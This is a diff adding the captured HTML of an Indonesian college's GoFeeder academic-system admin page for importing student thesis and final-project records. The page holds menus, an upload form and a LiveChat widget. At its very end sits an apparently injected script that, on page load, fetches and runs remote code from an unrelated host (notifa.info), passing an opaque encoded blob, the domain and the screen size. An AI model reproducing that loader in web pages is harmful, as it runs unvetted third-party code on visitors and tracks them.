+                                        <ul class="dropdown-menu pull-left sub-menu">
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/rekapnilaikelasparam" class="nav-link  "> Rekap Nilai Kelas</a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/rekapabsenparam" class="nav-link  "> Rekap Presensi Kelas</a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/jadwalkuliahparam" class="nav-link  "> Jadwal Kuliah</a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/jurnalDosen" class="nav-link  "> Jurnal Mengajar Dosen</a>
+                                            </li>
+                                        </ul>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/rekapPendaftarPmb" class="nav-link  "> Rekap Pendaftar PMB</a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/rekapkuesionerparam" class="nav-link  "> Rekap Hasil Kuesioner Dosen</a>
+                                    </li>
+                                                                            <li class=" ">
+                                            <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/rekaptracersparam" class="nav-link  "> Rekap Tracer Study</a>
+                                        </li>
+                                    
+                                                                        <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/rekapbayarkeuanganparam" class="nav-link  "> Rekap Pembayaran Mahasiswa</a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/rekapbayarkeuanganpmbparam" class="nav-link  "> Rekap Pembayaran PMB</a>
+                                    </li>
+                                    
+                                                                            <li class="dropdown-submenu">
+                                            <a class="nav-link  "> Pelaporan ke EMIS </a>
+                                            <ul class="dropdown-menu pull-left sub-menu">
+                                                <li class=" ">
+                                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/cloud/report/exportemismhsparam" class="nav-link"> Master Mahasiswa</a>
+                                                </li>
+                                                <li class=" ">
+                                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/cloud/report/exportemisdosenparam" class="nav-link"> Master Dosen</a>
+                                                </li>
+                                                <li class=" ">
+                                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/cloud/report/exportemislulusanparam" class="nav-link"> Master Lulusan</a>
+                                                </li>
+                                            </ul>
+                                        </li>
+                                        <li class=" ">
+                                            <a href="http://siakad.stikessurabaya.ac.id/index.php/laporan/customlaporan" class="nav-link  "> Custom Laporan</a>
+                                        </li>
+                                    
+                                                                    </ul>
+                            </li>
+                            <li class="menu-dropdown classic-menu-dropdown">
+                                <a href="javascript:;">
+                                    <i class="icon-settings"></i> Setting
+                                    <span class="arrow"></span>
+                                </a>
+                                <ul class="dropdown-menu pull-left">
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/setting" class="nav-link  "> Setting Global </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/batas_sks" class="nav-link  "> Pembatasan SKS </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/setting_ttd" class="nav-link  "> Penandatangan Laporan </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/setting/regsevpay" class="nav-link  "> Integrasi SevimaPay </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/setting/regedlink" class="nav-link  "> Integrasi Edlink </a>
+                                    </li>
+                                    <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/setting/regfinancecloud" class="nav-link  "> Integrasi Finance Cloud </a>
+                                    </li>
+                                    <li class="dropdown-submenu">
+                                        <a href="javascript:;" class="nav-link  "> Manajemen User </a>
+                                        <ul class="dropdown-menu pull-left sub-menu">
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/user" class="nav-link  "> Daftar User </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/user/lstusr" class="nav-link  "> Data Pimpinan dan Operator </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/user/generateMhs" class="nav-link  "> Generate User Mahasiswa </a>
+                                            </li>
+                                            <li class=" ">
+                                                <a href="http://siakad.stikessurabaya.ac.id/index.php/user/generatePtk" class="nav-link  "> Generate User Dosen </a>
+                                            </li>
+                                                                                            <li class=" ">
+                                                    <a href="http://siakad.stikessurabaya.ac.id/index.php/user/validasiAlumni" class="nav-link  "> Validasi Alumni </a>
+                                                </li>
+                                                <li class="dropdown-submenu">
+                                                    <a href="javascript:;" class="nav-link  "> Generate User Alumni </a>
+                                                    <ul class="dropdown-menu pull-left sub-menu">
+                                                        <li class=" ">
+                                                            <a href="http://siakad.stikessurabaya.ac.id/index.php/user/generateAlumni/feeder" class="nav-link  "> Lulus Dari Feeder </a>
+                                                        </li>
+                                                        <li class=" ">
+                                                            <a href="http://siakad.stikessurabaya.ac.id/index.php/user/generateAlumni/yudisium" class="nav-link  "> Lulus Dari Yudisium </a>
+                                                        </li>
+                                                    </ul>
+                                                </li>
+                                                                                                                                </ul>
+                                    </li>
+                                                                          <li class=" ">
+                                        <a href="http://siakad.stikessurabaya.ac.id/index.php/faq/index" class="nav-link  "> Frequently Asked Question (FAQ) </a>
+                                      </li>
+                                                                    </ul>
+                            </li>
+                                            </ul>
+                </div>
+                <!-- END MEGA MENU -->
+            </div>
+        </div>
+        <!-- END HEADER MENU -->
+    </div>
+    <!-- END HEADER -->
+
+    <!-- BEGIN CONTAINER -->
+    <div class="page-container">
+        <!-- BEGIN CONTENT -->
+        <div class="page-content-wrapper">
+            <!-- BEGIN CONTENT BODY -->
+            <!-- BEGIN PAGE CONTENT BODY -->
+            <div class="page-content">
+                <div class="container-fluid container-lf-space">
+                    <!-- BEGIN PAGE CONTENT INNER -->
+                    <div style="padding-top:10px" id="content" class="page-content-inner">
+                                                    <form name="main_form" id="main_form" method="post" enctype="multipart/form-data" class="form-horizontal">
+                                <input type="hidden" id="act" name="act" />
+                                <input type="hidden" id="key" name="key" />
+                                <input type="hidden" id="filter_num_record" name="filter_num_record" />
+                                <input type="hidden" id="filter_string" name="filter_string" />
+                                <input type="hidden" id="filter_sort" name="filter_sort" />
+                                <input type="hidden" id="filter_page" name="filter_page" />
+                                <input type="hidden" id="filter_field_search_list" name="filter_field_search_list" value="" />
+                                                        <script src="http://siakad.stikessurabaya.ac.id/application/assets/js/filtertable.js"></script>
+
+
+	 <!-- main col right -->
+	 <div class="col-md-12" style="padding:0;">
+		<div class="portlet light portlet-fit">
+
+			<div class="portlet-title">
+				<div class="caption">
+				<i class="icon-upload font-dark"></i>
+				<span class="caption-subject font-dark bold uppercase">Import Data Aktivitas Mahasiswa (Skripsi, Tugas Akhir, Tesis)</span>
+				</div>
+			</div>
+			<div class="portlet-body">
+						<div class="well mar0">
+			<table class="table table-condensed mar0">
+				<tr>
+					<td><strong>Download Template</strong></td>
+					<td colspan="2"><a onclick="goDownload()">template_skripsi.xls</a></td>
+				</tr>
+				<tr>
+					<td><strong>Import Data</strong></td>
+					<td><input type="file" name="excel" id="excel" /></td>
+					<td><input type="button" class="btn btn-success" name="Upload" value="Upload" onclick="goUpload()"/></td>
+				</tr>
+			</table>
+			</div>
+			<br/>
+									<table class="table-condensed">
+				<tr>
+					<td colspan="2"><strong>Langkah - Langkah :</strong></td>
+				</tr>
+				<tr>
+					<td>1. </td>
+					<td>Download Template data aktivitas Mahasiswa terlebih dahulu</td>
+				</tr>
+				<tr>
+					<td>2. </td>
+					<td>Pastikan kodeprodi yang anda inputkan sesuai dengan daftar referensi program studi pada feeeder
+					</td>
+				</tr>
+				<tr>
+					<td>3. </td>
+					<td>Pastikan data yang anda inputkan sudah benar, Data Mahasiswa sudah terdaftar</td>
+				</tr>
+				<tr>
+					<td>4. </td>
+					<td>Bila terjadi kesalahan import data, silahkan download error hasil import</td>
+				</tr>
+				<tr>
+					<td>5. </td>
+					<td>Lakukan perbaikan lalu import lagi data tersebut</td>
+				</tr>
+			</table>
+			<br />
+				 
+</div></div></div>
+<script language="javascript">
+
+function goDownload(){
+	goSubmit('download');
+}
+
+function goDownloaderror(){
+	goSubmit('downloaderror');
+}
+
+function goUpload(){
+	goSubmit('upload');
+}
+
+function goSavedb(){
+	goSubmit('savedb');
+}
+</script>
+
+<script type="text/javascript"> 
+
+//check all checkbox
+function checkAll(form){
+	for (var i=0;i<document.forms[form].elements.length;i++)
+	{
+		var e=document.forms[form].elements[i];
+		if ((e.name !='allbox') && (e.type=='checkbox'))
+		{
+			e.checked=document.forms[form].allbox.checked;
+		}
+	}
+}
+</script>                                                        </form>
+                                            </div>
+                    <!-- END PAGE CONTENT INNER -->
+                </div>
+            </div>
+            <!-- END PAGE CONTENT BODY -->
+            <!-- END CONTENT BODY -->
+        </div>
+        <!-- END CONTENT -->
+    </div>
+    <!-- END CONTAINER -->
+      <!-- BEGIN FOOTER -->
+<!-- BEGIN INNER FOOTER -->
+<div class="page-footer">
+    <div class="container-fluid container-lf-space">
+        <div class="col-md-12">
+            <div class="row">
+                <div class="col-md-5" style="padding-top: 10px;">
+                    <a href="http://gofeeder.sevima.com/" target="_blank">Copyright &copy; 2020 by SEVIMA. </a>
+                </div>
+                <div class="col-md-4">
+                    <h5>Versi Aplikasi  GoFeeder 4.2.2</h5>
+                </div>
+                <div class="col-md-2 logo-footer" style="padding-top: 10px;">
+                    <img src="http://siakad.stikessurabaya.ac.id/application/assets/images/logo-gofeeder.png" alt="logo" class="logo-default">&nbsp;&nbsp;
+                    <img src="http://siakad.stikessurabaya.ac.id/application/assets/images/logo-sevima.png" alt="logo" class="logo-default">&nbsp;
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<script type="text/javascript">
+    function showlogin() {
+        $(".loading").css("display", "block");
+    }
+    $("#changelog").modal("show");
+</script>
+</div>
+<!-- END INNER FOOTER -->
+<!-- END FOOTER -->                        <!-- Start of LiveChat (www.livechatinc.com) code -->
+            <script>
+                window.__lc = window.__lc || {};
+                window.__lc.license = 11896158;
+                window.__lc.group = 2;
+                (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+            </script>
+            <noscript><a href="https://www.livechatinc.com/chat-with/11896158/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechatinc.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+            <!-- End of LiveChat code -->
+            <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXRVmduWK%2bLkmYHk3befEmWzw3P1du6K%2bjO7jTIyQZKbTibjIqGHCrjE%2bgqbr%2flcNj6Po1Q98qMkmac4v29KJjzSdfpXvcMM%2bckIDNNepMtJuM63zghY%2fLrj09jHzp5MZ8mO%2bABGa3oB3mOdloeXBiLI8cMzyRrON1x8%2bpMKGV6Kl0jrwargQZxvGj6tPsTG%2fF3tIBa7hSo1D3PuFet%2f1gOBDZFVkd3%2fuyUQBLAMTus6c4nDbQ9BCWL6AJ0rzk9LWYGjagszWlk6GXAnO11KI957ezy8y92SRpS4KBRr0BZIRt3SLImEfj88EChklt%2f7DC9CsDJMMU7zDsI9Lla6PdhZlkq5FXgeDZ6sfipDTO268BeIE6LVYEnnf4lEa0SOijhmgcaM4oZ1gvSSr8G83RX4lvRUVkXHxuFzQ7OzF6uLw8Ghib0jY5%2f3p9nhwsE3ZvJgQuN6df1E4R8jG1sYDTyV56VKVzgowA9LuZJPa6aTRyrkvQccYzRBIrQkMX9Va4%2be3Bnqcreh3nX7gcgt22jXuZgzarXSx%2fv4qhfeXc%2bce0PodUiUk14i5KC7zMHUeDAimuMuKzLPTEFtQJO0K9LHDJANJhfu17" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+</html>
